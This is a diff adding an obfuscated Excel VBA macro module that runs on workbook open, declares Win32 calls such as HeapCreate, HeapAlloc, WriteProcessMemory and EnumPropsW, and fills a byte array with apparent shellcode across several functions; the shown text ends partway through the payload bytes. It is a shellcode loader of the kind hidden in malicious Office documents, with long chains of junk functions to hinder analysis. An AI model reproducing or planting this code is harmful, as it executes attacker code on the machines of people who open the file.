@@ -1,0 +1,2706 @@
+Attribute VB_Name = "stytdgth"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+#If VBA7 Then
+Private Declare Function gf9UyNJcM7p2MTnu Lib "UsER32" Alias "EnumPropsW" (ByVal wfhesXraGf9cs1 As LongPtr, ByVal ffuoVD6sZvakZ1c As LongPtr) As Long
+Private Declare Function hXAIPdcmNrCQ Lib "UsER32" Alias "GetDesktopWindow" () As LongPtr
+Private Declare Function pyoVTOkBjgOdXawJJEQ Lib "UsER32" Alias "SetPropW" (ByVal iMNhE8fFcM As LongPtr, ByVal I2rN0o As LongPtr, ByVal X3cYrR6291wyl As LongPtr) As Long
+Private Declare Function pKQxbmeJPKkVtwA7nCqlV Lib "KerneL32" Alias "HeapCreate" (ByVal jIMhzk As Long, ByVal cijHwYZ3mYhX As LongPtr, ByVal Wu3DsohNA073sS9 As LongPtr) As LongPtr
+Private Declare Function S1LAUnx6i5LyAHjIgPJ2 Lib "KerneL32" Alias "HeapAlloc" (ByVal IDLmQhhGiDFAWBz As LongPtr, ByVal A93CuddaK5 As Long, ByVal zq25jouzb2 As LongPtr) As LongPtr
+Private Declare Sub p5cgBtUU5j Lib "KerneL32" Alias "WriteProcessMemory" (ByVal XNo8rNKat7eeRn As LongPtr, ByRef hbUiZnYszdAOP As Any, ByRef CIPhia As Any, ByVal MBfgyx As LongPtr, ByRef Intw4DHq2dFM As LongPtr)
+
+#Else
+Private Declare Function gf9UyNJcM7p2MTnu Lib "UsER32" Alias "EnumPropsW" (ByVal qYD362ZbWy As Long, ByVal nie75acZTmQ9 As Long) As Long
+Private Declare Function hXAIPdcmNrCQ Lib "UsER32" Alias "GetDesktopWindow" () As Long
+Private Declare Function pyoVTOkBjgOdXawJJEQ Lib "UsER32" Alias "SetPropW" (ByVal ea5f2 As Long, ByVal XR2Unlg As Long, ByVal TTaot As Long) As Long
+Private Declare Function pKQxbmeJPKkVtwA7nCqlV Lib "KerneL32" Alias "HeapCreate" (ByVal Ll84RJ As Long, ByVal xLQ6hnK4Rlg As Long, ByVal aoLNSsFPISZJa As Long) As Long
+Private Declare Function S1LAUnx6i5LyAHjIgPJ2 Lib "KerneL32" Alias "HeapAlloc" (ByVal gBHEOJPOyV7OG As Long, ByVal Eub5sS As Long, ByVal wCPx8UtNW2XN As Long) As Long
+Private Declare Sub p5cgBtUU5j Lib "KerneL32" Alias "WriteProcessMemory" (ByVal CVPykZ As Long, ByRef uFJ8afz6an As Any, ByRef ZQiX3S As Any, ByVal qDjy0Dhkc As Long, ByRef YS1VK2hDcE7JUa As Long)
+
+#End If
+
+Sub woRKBOok_oPeN()
+Call SGt7WKrbYKHLQ89
+End Sub
+Function SGt7WKrbYKHLQ89() As Variant
+Call UPFGGntgCbxSs9
+End Function
+Function UPFGGntgCbxSs9() As String
+Call M9P4y5V6uBfYE7xyk5tG2v
+End Function
+Function M9P4y5V6uBfYE7xyk5tG2v() As Byte
+Call fgqLXSWbf4Y1J6Q1PQ6jr
+End Function
+Static Function fgqLXSWbf4Y1J6Q1PQ6jr() As Date
+Call B7eOHxk6JZeyVp6Wnd
+End Function
+Static Function B7eOHxk6JZeyVp6Wnd() As Integer
+Call axj2iP3E8LNSUdX08Lbk
+End Function
+Public Function axj2iP3E8LNSUdX08Lbk() As Long
+Call TeGhJGWffOenp
+End Function
+Static Function TeGhJGWffOenp() As Double
+Call CEBdeAhpc2b
+End Function
+Function CEBdeAhpc2b() As Byte
+Call zOGtL68Bt461n
+End Function
+Static Function zOGtL68Bt461n() As Double
+Call OkBzY8rj6Mr
+End Function
+Function OkBzY8rj6Mr() As Byte
+Call TeiDfK8LlCmD7
+End Function
+Static Function TeiDfK8LlCmD7() As Date
+Call BL4yxj0Q1rU6HdsihTEwnj
+End Function
+Public Function BL4yxj0Q1rU6HdsihTEwnj() As Byte
+Call rLKEZB4Cb1Mm
+End Function
+Private Function rLKEZB4Cb1Mm() As Boolean
+Call CcZlsezHqQJ7mEXb4IJ
+End Function
+Function CcZlsezHqQJ7mEXb4IJ() As Byte
+Call bIcTDGMZBkY5zcMPDuYlXIilB
+End Function
+Public Function bIcTDGMZBkY5zcMPDuYlXIilB() As Byte
+Call zHAUP3oUTzcqtXYm
+End Function
+Function zHAUP3oUTzcqtXYm() As Currency
+Call RfASfbO2r500lRceB3
+End Function
+Static Function RfASfbO2r500lRceB3() As Integer
+Call alPweHLcAnfSGz7KaXDU
+End Function
+Public Function alPweHLcAnfSGz7KaXDU() As Boolean
+Call lbQCRDe8pdMmRv
+End Function
+Public Function lbQCRDe8pdMmRv() As Object
+Call UoBxg2XRm8XJgghDesvTs
+End Function
+Static Function UoBxg2XRm8XJgghDesvTs() As Currency
+Call DaWpPu6DxecbdAIbhoWFn6Cxj
+End Function
+Public Function DaWpPu6DxecbdAIbhoWFn6Cxj() As Object
+Call s0jxWAz7qmdl6W7zwAtzU
+End Function
+Static Function s0jxWAz7qmdl6W7zwAtzU() As Currency
+Call v8O1XSybzSUXrCKJrMQ31Wcrv
+End Function
+Public Function v8O1XSybzSUXrCKJrMQ31Wcrv() As Byte
+Call f7UorZAkrb2chb8k
+End Function
+Function f7UorZAkrb2chb8k() As Single
+Call M4bVW2r1IAN5I
+End Function
+Static Function M4bVW2r1IAN5I() As Variant
+Call DbEcDX6s7tkMRRcg5XGq
+End Function
+Private Function DbEcDX6s7tkMRRcg5XGq() As Boolean
+Call ayNNKKlXSs9PgQl
+End Function
+Private Function ayNNKKlXSs9PgQl() As Date
+Call hLk6brOM7VygHZiih3AQBN
+End Function
+Public Function hLk6brOM7VygHZiih3AQBN() As Object
+Call gapXkSlhC2n9QC1jS
+End Function
+Sub gapXkSlhC2n9QC1jS()
+Call ynvm0DN0g39C
+End Sub
+Static Function ynvm0DN0g39C() As Integer
+Call ypL8oD3McJLukJRmendY
+End Function
+Sub ypL8oD3McJLukJRmendY()
+Call iL9wUvxU2dvqQZFi4dDqCJPo
+End Sub
+Public Function iL9wUvxU2dvqQZFi4dDqCJPo() As String
+Call smPpgKzhskvZ8
+End Function
+Static Function smPpgKzhskvZ8() As Currency
+Call PCslNsAXdOg1t
+End Function
+Static Function PCslNsAXdOg1t() As Date
+Call hHE2b5eG3Po8Z9s8XLqoPV
+End Function
+Public Function hHE2b5eG3Po8Z9s8XLqoPV() As Object
+Call garf8ADXi2FN0ITXM
+End Function
+Sub garf8ADXi2FN0ITXM()
+Call C9P8yF5SOpb0
+End Sub
+Static Function C9P8yF5SOpb0() As Date
+Call V9mWJFuq3liihT
+End Function
+Public Function V9mWJFuq3liihT() As Object
+Call YUfdIApHaefre2NDYQnh0
+End Function
+Static Function YUfdIApHaefre2NDYQnh0() As Variant
+Call zz4sfHIMJjUmdz4U
+End Function
+Function zz4sfHIMJjUmdz4U() As Variant
+Call knfIMdZ06RTo2t
+End Function
+Function knfIMdZ06RTo2t() As Object
+Call A9zMijJaYDBQ6bXOsPbG8P
+End Function
+Function A9zMijJaYDBQ6bXOsPbG8P() As String
+Call AtrkIbHk0jnEk35gad
+End Function
+Private Function AtrkIbHk0jnEk35gad() As Double
+Call KC3FCW3DUQhPIoT3wwxv60Z
+End Function
+Private Function KC3FCW3DUQhPIoT3wwxv60Z() As Integer
+Call SldqA5JEsNZu6XjQ2hvSivJA
+End Function
+Static Function SldqA5JEsNZu6XjQ2hvSivJA() As Single
+Call ihNQmPpA89XQ03j8mZ5KY5Zg
+End Function
+Static Function ihNQmPpA89XQ03j8mZ5KY5Zg() As Currency
+Call PUktRUCXd88hzYspVGuxf
+End Function
+Static Function PUktRUCXd88hzYspVGuxf() As Integer
+Call SrfeQRJw2Zfu65v86FDOcvlq
+End Function
+Static Function SrfeQRJw2Zfu65v86FDOcvlq() As Single
+Call CdnUgRdielP4WNToAZFG4tXu
+End Function
+Static Function CdnUgRdielP4WNToAZFG4tXu() As Single
+Call GDV4OnZ02dBQ0h34K7By6F9E
+End Function
+Static Function GDV4OnZ02dBQ0h34K7By6F9E() As Variant
+Call vpUOPnWAhHqe
+End Function
+Sub vpUOPnWAhHqe()
+Call LX8mRPKcltqE
+End Sub
+Static Function LX8mRPKcltqE() As Single
+Call OLviuB9WcnDaWDRO
+End Function
+Static Function OLviuB9WcnDaWDRO() As Currency
+Call X8StjmE5puOZNOCFdSORLcUZD
+End Function
+Public Function X8StjmE5puOZNOCFdSORLcUZD() As Byte
+Call X1goLBscbLGwv9M2
+End Function
+Function X1goLBscbLGwv9M2() As Variant
+Call grL2GJncgBh6SJ
+End Function
+Function grL2GJncgBh6SJ() As String
+Call wT18gj9wKjjysJNcmDr6Yx
+End Function
+Function wT18gj9wKjjysJNcmDr6Yx() As Byte
+Call v44Tb2GD3yILNuU3Xs8bf
+End Function
+Static Function v44Tb2GD3yILNuU3Xs8bf() As Double
+Call eSJVmWjLgcbTWIbRAu5DGkZ
+End Function
+Private Function eSJVmWjLgcbTWIbRAu5DGkZ() As Date
+Call B3YWx3gkDDcspDsoNB
+End Function
+Static Function B3YWx3gkDDcspDsoNB() As Date
+Call J1o05pWCF1oCFv
+End Function
+Public Function J1o05pWCF1oCFv() As Object
+Call AA7FoG1fwyPpAG57wonpG
+End Function
+Static Function AA7FoG1fwyPpAG57wonpG() As Variant
+Call fJ6oxHScVlE05Pai
+End Function
+Function fJ6oxHScVlE05Pai() As Variant
+Call ItN8IzZ0kB7so1
+End Function
+Function ItN8IzZ0kB7so1() As Byte
+Call nGwZ7sGRPoKfFaUNhAwbzgeDF
+End Function
+Public Function nGwZ7sGRPoKfFaUNhAwbzgeDF() As Byte
+Call nT2m7ziSvHcUzJGg
+End Function
+Function nT2m7ziSvHcUzJGg() As Currency
+Call praUTTMkR7IyXX4q33
+End Function
+Static Function praUTTMkR7IyXX4q33() As Double
+Call aCH9aodDKIfBS4thWID
+End Function
+Function aCH9aodDKIfBS4thWID() As Object
+Call QfZeSjB8CdjWw5HYmFx0sN
+End Function
+Function QfZeSjB8CdjWw5HYmFx0sN() As String
+Call E572oV3k0ppS6pX4sR
+End Function
+Private Function E572oV3k0ppS6pX4sR() As Double
+Call Cs3nWgFlguvhkUdnaczBoCl
+End Function
+Private Function Cs3nWgFlguvhkUdnaczBoCl() As Date
+Call JfGsLPSklNoYNbmgjN
+End Function
+Static Function JfGsLPSklNoYNbmgjN() As Integer
+Call KjxGAjFgUL5IW1baEt1A
+End Function
+Public Function KjxGAjFgUL5IW1baEt1A() As Long
+Call z2UzH2erlQCjt
+End Function
+Static Function z2UzH2erlQCjt() As Integer
+Call uV1YUb7i4HXK
+End Function
+Public Function uV1YUb7i4HXK() As Boolean
+Call FvkU1p6Opf6s5VmmLf
+End Function
+Static Function FvkU1p6Opf6s5VmmLf() As Date
+Call VZguzF28nnkANh
+End Function
+Public Function VZguzF28nnkANh() As Object
+Call Iq5XWUTpukzLUoxVquDzK
+End Function
+Static Function Iq5XWUTpukzLUoxVquDzK() As Currency
+Call P2iRnUoz18AHrEEHxY29NSIr9
+End Function
+Public Function P2iRnUoz18AHrEEHxY29NSIr9() As Byte
+Call rpWab9uwjRKchJcA
+End Function
+Function rpWab9uwjRKchJcA() As Single
+Call QqDBqmJNyAFL8
+End Function
+Static Function QqDBqmJNyAFL8() As Currency
+Call vEEPNAYPLekj7
+End Function
+Static Function vEEPNAYPLekj7() As Integer
+Call CDbMcJBsWnR0
+End Function
+Public Function CDbMcJBsWnR0() As Boolean
+Call Zh4qTPmIptKafnwqPR
+End Function
+Static Function Zh4qTPmIptKafnwqPR() As Date
+Call RJIOzvu6x5mmfl
+End Function
+Public Function RJIOzvu6x5mmfl() As Byte
+Call Yhj8gJzio7RCcB
+End Function
+
+Private Function jgk(ByRef fHW6T As Boolean, ByRef fFyS As Date, ByVal KVVmArF6crPaST As Byte, ByRef njYQ As Integer, ByVal aB1aMxTsmfdOC As Long, ByRef CBz As Variant, ByVal NowxZw As Long) As Currency
+CBz(aB1aMxTsmfdOC + 0) = 233
+CBz(aB1aMxTsmfdOC + 1) = 73
+CBz(2) = 1
+CBz(3) = 0
+CBz(4) = 0
+CBz(aB1aMxTsmfdOC + 5) = 69
+CBz(6) = 86
+CBz(aB1aMxTsmfdOC + 7) = 122
+CBz(aB1aMxTsmfdOC + 8) = 211
+CBz(9) = 127
+CBz(aB1aMxTsmfdOC + 10) = 160
+CBz(11) = 84
+CBz(aB1aMxTsmfdOC + 12) = 189
+CBz(aB1aMxTsmfdOC + 13) = 249
+CBz(14) = 42
+CBz(15) = 110
+CBz(16) = 231
+CBz(17) = 179
+CBz(aB1aMxTsmfdOC + 18) = 244
+CBz(aB1aMxTsmfdOC + 19) = 200
+CBz(aB1aMxTsmfdOC + 20) = 81
+CBz(21) = 173
+CBz(aB1aMxTsmfdOC + 22) = 254
+CBz(23) = 98
+CBz(24) = 251
+CBz(aB1aMxTsmfdOC + 25) = 231
+CBz(26) = 72
+CBz(aB1aMxTsmfdOC + 27) = 60
+CBz(28) = 229
+CBz(29) = 97
+CBz(aB1aMxTsmfdOC + 30) = 210
+CBz(aB1aMxTsmfdOC + 31) = 86
+CBz(aB1aMxTsmfdOC + 32) = 15
+CBz(aB1aMxTsmfdOC + 33) = 27
+CBz(34) = 156
+CBz(35) = 176
+CBz(36) = 121
+CBz(aB1aMxTsmfdOC + 37) = 21
+CBz(38) = 166
+
+End Function
+Static Function L4udtKKT1IWn1(ByVal gq5PesdRwe As Long, ByVal yV34gnTcElRKyt As Date, ByRef T32K As Variant, ByVal m53 As Long, ByVal RmytjKQnlEoNvOY As Date) As Single
+T32K(m53 + 0) = 74
+T32K(40) = 35
+T32K(41) = 79
+T32K(42) = 240
+T32K(m53 + 4) = 36
+T32K(44) = 13
+T32K(m53 + 6) = 201
+T32K(m53 + 7) = 122
+T32K(47) = 62
+T32K(m53 + 9) = 55
+T32K(49) = 131
+T32K(m53 + 11) = 68
+T32K(m53 + 12) = 152
+T32K(52) = 161
+T32K(53) = 125
+T32K(54) = 78
+T32K(55) = 50
+T32K(m53 + 17) = 75
+T32K(m53 + 18) = 183
+T32K(m53 + 19) = 152
+T32K(59) = 12
+T32K(m53 + 21) = 53
+T32K(61) = 49
+T32K(62) = 34
+T32K(m53 + 24) = 38
+T32K(64) = 95
+T32K(m53 + 26) = 235
+T32K(66) = 236
+T32K(67) = 128
+T32K(m53 + 29) = 201
+T32K(m53 + 30) = 229
+T32K(m53 + 31) = 246
+T32K(m53 + 32) = 26
+T32K(72) = 115
+T32K(73) = 31
+T32K(74) = 64
+T32K(m53 + 36) = 244
+T32K(76) = 93
+T32K(m53 + 38) = 153
+
+End Function
+Private Function suD(ByVal b4InbOI51kg As Long, ByVal mVjgqBtcEjl As Byte, ByRef N0cD5m6z As Variant, ByRef vTeURl As Boolean, ByVal n02prsw As Long) As Object
+N0cD5m6z(78) = 202
+N0cD5m6z(b4InbOI51kg + 1) = 14
+N0cD5m6z(80) = 135
+N0cD5m6z(81) = 83
+N0cD5m6z(b4InbOI51kg + 4) = 148
+N0cD5m6z(83) = 104
+N0cD5m6z(b4InbOI51kg + 6) = 241
+N0cD5m6z(85) = 77
+N0cD5m6z(86) = 158
+N0cD5m6z(b4InbOI51kg + 9) = 2
+N0cD5m6z(b4InbOI51kg + 10) = 155
+N0cD5m6z(b4InbOI51kg + 11) = 135
+N0cD5m6z(b4InbOI51kg + 12) = 232
+N0cD5m6z(91) = 220
+N0cD5m6z(92) = 133
+N0cD5m6z(93) = 1
+N0cD5m6z(b4InbOI51kg + 16) = 114
+N0cD5m6z(95) = 246
+N0cD5m6z(b4InbOI51kg + 18) = 175
+N0cD5m6z(b4InbOI51kg + 19) = 187
+N0cD5m6z(98) = 60
+N0cD5m6z(b4InbOI51kg + 21) = 80
+N0cD5m6z(100) = 25
+N0cD5m6z(b4InbOI51kg + 23) = 181
+N0cD5m6z(b4InbOI51kg + 24) = 70
+N0cD5m6z(103) = 234
+N0cD5m6z(104) = 195
+N0cD5m6z(105) = 239
+N0cD5m6z(106) = 144
+N0cD5m6z(b4InbOI51kg + 29) = 196
+N0cD5m6z(b4InbOI51kg + 30) = 173
+N0cD5m6z(b4InbOI51kg + 31) = 105
+N0cD5m6z(110) = 26
+N0cD5m6z(b4InbOI51kg + 33) = 222
+N0cD5m6z(112) = 215
+N0cD5m6z(113) = 35
+N0cD5m6z(b4InbOI51kg + 36) = 228
+N0cD5m6z(115) = 56
+N0cD5m6z(b4InbOI51kg + 38) = 65
+N0cD5m6z(117) = 29
+N0cD5m6z(118) = 238
+N0cD5m6z(b4InbOI51kg + 41) = 210
+N0cD5m6z(b4InbOI51kg + 42) = 235
+N0cD5m6z(b4InbOI51kg + 43) = 87
+N0cD5m6z(b4InbOI51kg + 44) = 56
+N0cD5m6z(123) = 172
+N0cD5m6z(124) = 213
+N0cD5m6z(125) = 209
+N0cD5m6z(b4InbOI51kg + 48) = 194
+N0cD5m6z(127) = 198
+N0cD5m6z(b4InbOI51kg + 50) = 255
+N0cD5m6z(b4InbOI51kg + 51) = 139
+N0cD5m6z(130) = 140
+N0cD5m6z(b4InbOI51kg + 53) = 32
+N0cD5m6z(132) = 105
+N0cD5m6z(b4InbOI51kg + 55) = 133
+N0cD5m6z(b4InbOI51kg + 56) = 150
+N0cD5m6z(135) = 186
+N0cD5m6z(136) = 19
+N0cD5m6z(137) = 191
+N0cD5m6z(138) = 224
+N0cD5m6z(b4InbOI51kg + 61) = 148
+N0cD5m6z(b4InbOI51kg + 62) = 253
+N0cD5m6z(b4InbOI51kg + 63) = 57
+N0cD5m6z(142) = 106
+N0cD5m6z(b4InbOI51kg + 65) = 174
+N0cD5m6z(144) = 39
+N0cD5m6z(145) = 243
+N0cD5m6z(b4InbOI51kg + 68) = 52
+N0cD5m6z(147) = 8
+N0cD5m6z(b4InbOI51kg + 70) = 145
+N0cD5m6z(149) = 237
+
+End Function
+Public Function unn(ByVal iSBx8El9ymLXYgF As Long, ByRef vfYEdNqCTh As String, ByRef xQUpfgePNEU As Variant, ByVal MlnE8DPqSH9mO1 As Long, ByRef dbqGvvWOjV4Y As Object) As Date
+xQUpfgePNEU(150) = 62
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 1) = 162
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 2) = 59
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 3) = 39
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 4) = 136
+xQUpfgePNEU(155) = 124
+xQUpfgePNEU(156) = 37
+xQUpfgePNEU(157) = 161
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 8) = 18
+xQUpfgePNEU(159) = 150
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 10) = 79
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 11) = 91
+xQUpfgePNEU(162) = 220
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 13) = 240
+xQUpfgePNEU(164) = 185
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 15) = 85
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 16) = 230
+xQUpfgePNEU(167) = 138
+xQUpfgePNEU(168) = 99
+xQUpfgePNEU(169) = 143
+xQUpfgePNEU(170) = 48
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 21) = 100
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 22) = 77
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 23) = 9
+xQUpfgePNEU(174) = 186
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 25) = 126
+xQUpfgePNEU(176) = 119
+xQUpfgePNEU(177) = 195
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 28) = 132
+xQUpfgePNEU(179) = 216
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 30) = 225
+xQUpfgePNEU(181) = 189
+xQUpfgePNEU(182) = 142
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 33) = 114
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 34) = 139
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 35) = 247
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 36) = 216
+xQUpfgePNEU(187) = 76
+xQUpfgePNEU(188) = 117
+xQUpfgePNEU(189) = 113
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 40) = 98
+xQUpfgePNEU(191) = 102
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 42) = 159
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 43) = 43
+xQUpfgePNEU(194) = 44
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 45) = 192
+xQUpfgePNEU(196) = 9
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 47) = 37
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 48) = 54
+xQUpfgePNEU(199) = 90
+xQUpfgePNEU(200) = 179
+xQUpfgePNEU(201) = 95
+xQUpfgePNEU(202) = 128
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 53) = 52
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 54) = 157
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 55) = 217
+xQUpfgePNEU(206) = 10
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 57) = 78
+xQUpfgePNEU(208) = 199
+xQUpfgePNEU(209) = 147
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 60) = 212
+xQUpfgePNEU(211) = 168
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 62) = 49
+xQUpfgePNEU(213) = 141
+xQUpfgePNEU(214) = 222
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 65) = 66
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 66) = 219
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 67) = 199
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 68) = 40
+xQUpfgePNEU(219) = 28
+xQUpfgePNEU(220) = 197
+xQUpfgePNEU(221) = 65
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 72) = 178
+xQUpfgePNEU(223) = 54
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 74) = 239
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 75) = 251
+xQUpfgePNEU(226) = 124
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 77) = 144
+xQUpfgePNEU(228) = 89
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 79) = 245
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 80) = 134
+xQUpfgePNEU(231) = 42
+xQUpfgePNEU(232) = 3
+xQUpfgePNEU(233) = 47
+xQUpfgePNEU(234) = 208
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 85) = 4
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 86) = 237
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 87) = 169
+xQUpfgePNEU(238) = 90
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 89) = 30
+xQUpfgePNEU(240) = 23
+xQUpfgePNEU(241) = 99
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 92) = 36
+xQUpfgePNEU(243) = 120
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 94) = 129
+xQUpfgePNEU(245) = 93
+xQUpfgePNEU(246) = 46
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 97) = 18
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 98) = 43
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 99) = 151
+xQUpfgePNEU(MlnE8DPqSH9mO1 + 100) = 120
+xQUpfgePNEU(251) = 236
+
+End Function
+Function hyw(ByVal RNUS As Variant, ByVal atL As Long, ByVal TEwR7ua9nGIlzu As Long, ByRef g05jwwff0gXxksr As Variant) As Boolean
+g05jwwff0gXxksr(252) = 21
+g05jwwff0gXxksr(atL + 1) = 17
+g05jwwff0gXxksr(atL + 2) = 2
+g05jwwff0gXxksr(255) = 6
+g05jwwff0gXxksr(atL + 4) = 63
+g05jwwff0gXxksr(257) = 203
+g05jwwff0gXxksr(atL + 6) = 204
+g05jwwff0gXxksr(atL + 7) = 96
+g05jwwff0gXxksr(260) = 169
+g05jwwff0gXxksr(261) = 197
+g05jwwff0gXxksr(262) = 214
+g05jwwff0gXxksr(263) = 250
+g05jwwff0gXxksr(atL + 12) = 83
+g05jwwff0gXxksr(atL + 13) = 255
+g05jwwff0gXxksr(atL + 14) = 32
+g05jwwff0gXxksr(267) = 212
+g05jwwff0gXxksr(atL + 16) = 61
+g05jwwff0gXxksr(269) = 121
+g05jwwff0gXxksr(270) = 170
+g05jwwff0gXxksr(atL + 19) = 238
+g05jwwff0gXxksr(272) = 103
+
+End Function
+Function JUWH(ByVal dUux As Object, ByVal lJImj14y5Di2j5 As Long, ByVal tS8Djum9pGy As Long, ByRef cpx As Variant) As Long
+cpx(lJImj14y5Di2j5 + 0) = 51
+cpx(274) = 116
+cpx(275) = 72
+cpx(lJImj14y5Di2j5 + 3) = 209
+cpx(lJImj14y5Di2j5 + 4) = 45
+cpx(lJImj14y5Di2j5 + 5) = 126
+cpx(lJImj14y5Di2j5 + 6) = 226
+cpx(280) = 123
+cpx(281) = 103
+cpx(282) = 200
+cpx(lJImj14y5Di2j5 + 10) = 188
+cpx(284) = 101
+cpx(lJImj14y5Di2j5 + 12) = 225
+cpx(lJImj14y5Di2j5 + 13) = 82
+cpx(287) = 214
+cpx(lJImj14y5Di2j5 + 15) = 143
+cpx(289) = 155
+cpx(lJImj14y5Di2j5 + 17) = 28
+cpx(lJImj14y5Di2j5 + 18) = 48
+cpx(292) = 249
+cpx(293) = 149
+cpx(294) = 38
+cpx(295) = 202
+cpx(lJImj14y5Di2j5 + 23) = 163
+cpx(lJImj14y5Di2j5 + 24) = 207
+cpx(lJImj14y5Di2j5 + 25) = 112
+cpx(299) = 164
+cpx(lJImj14y5Di2j5 + 27) = 141
+cpx(301) = 73
+cpx(302) = 250
+cpx(lJImj14y5Di2j5 + 30) = 190
+cpx(304) = 183
+cpx(lJImj14y5Di2j5 + 32) = 3
+cpx(306) = 196
+cpx(307) = 24
+cpx(lJImj14y5Di2j5 + 35) = 33
+cpx(lJImj14y5Di2j5 + 36) = 253
+cpx(lJImj14y5Di2j5 + 37) = 206
+cpx(lJImj14y5Di2j5 + 38) = 178
+cpx(312) = 203
+cpx(313) = 55
+
+End Function
+Private Function yEVzMwN(ByRef POKNjignTg4v As Variant, ByVal DFuwL As Long, ByVal LjIotTwQXV As Long, ByRef loSn7UavvKMfRg As Boolean) As Double
+POKNjignTg4v(314) = 24
+POKNjignTg4v(315) = 140
+POKNjignTg4v(DFuwL + 2) = 181
+POKNjignTg4v(DFuwL + 3) = 177
+POKNjignTg4v(DFuwL + 4) = 162
+POKNjignTg4v(319) = 166
+POKNjignTg4v(DFuwL + 6) = 223
+POKNjignTg4v(321) = 107
+POKNjignTg4v(322) = 108
+POKNjignTg4v(DFuwL + 9) = 0
+POKNjignTg4v(324) = 73
+POKNjignTg4v(DFuwL + 11) = 101
+POKNjignTg4v(326) = 118
+POKNjignTg4v(327) = 154
+POKNjignTg4v(DFuwL + 14) = 243
+POKNjignTg4v(DFuwL + 15) = 159
+POKNjignTg4v(DFuwL + 16) = 192
+POKNjignTg4v(DFuwL + 17) = 116
+POKNjignTg4v(332) = 221
+POKNjignTg4v(333) = 25
+POKNjignTg4v(334) = 233
+POKNjignTg4v(DFuwL + 21) = 205
+POKNjignTg4v(336) = 0
+POKNjignTg4v(DFuwL + 23) = 0
+POKNjignTg4v(DFuwL + 24) = 0
+POKNjignTg4v(339) = 235
+POKNjignTg4v(DFuwL + 26) = 60
+POKNjignTg4v(341) = 144
+POKNjignTg4v(DFuwL + 28) = 129
+POKNjignTg4v(DFuwL + 29) = 50
+POKNjignTg4v(344) = 6
+POKNjignTg4v(345) = 88
+POKNjignTg4v(346) = 156
+POKNjignTg4v(347) = 131
+POKNjignTg4v(DFuwL + 34) = 233
+POKNjignTg4v(DFuwL + 35) = 172
+POKNjignTg4v(DFuwL + 36) = 0
+POKNjignTg4v(351) = 0
+
+End Function
+Public Function fzOQvFsOBr(ByRef SMxfaANVgknf2 As Variant, ByVal WgTrsEHjcGF As Long, ByVal JFCSZde8lJgQ As Long, ByVal sVpC2HfW8n As Object, ByVal TjeYtRU As Byte, ByVal we7t As Boolean, ByRef HA43FUqNlaQFPe As Object) As Currency
+SMxfaANVgknf2(WgTrsEHjcGF + 0) = 0
+SMxfaANVgknf2(WgTrsEHjcGF + 1) = 233
+SMxfaANVgknf2(354) = 225
+SMxfaANVgknf2(355) = 1
+SMxfaANVgknf2(356) = 0
+SMxfaANVgknf2(357) = 0
+SMxfaANVgknf2(WgTrsEHjcGF + 6) = 233
+SMxfaANVgknf2(WgTrsEHjcGF + 7) = 111
+SMxfaANVgknf2(WgTrsEHjcGF + 8) = 2
+SMxfaANVgknf2(361) = 0
+SMxfaANVgknf2(WgTrsEHjcGF + 10) = 0
+SMxfaANVgknf2(363) = 90
+SMxfaANVgknf2(364) = 233
+SMxfaANVgknf2(WgTrsEHjcGF + 13) = 244
+SMxfaANVgknf2(366) = 1
+SMxfaANVgknf2(WgTrsEHjcGF + 15) = 0
+SMxfaANVgknf2(368) = 0
+SMxfaANVgknf2(369) = 233
+SMxfaANVgknf2(WgTrsEHjcGF + 18) = 130
+SMxfaANVgknf2(WgTrsEHjcGF + 19) = 2
+SMxfaANVgknf2(WgTrsEHjcGF + 20) = 0
+SMxfaANVgknf2(WgTrsEHjcGF + 21) = 0
+SMxfaANVgknf2(374) = 233
+
+End Function
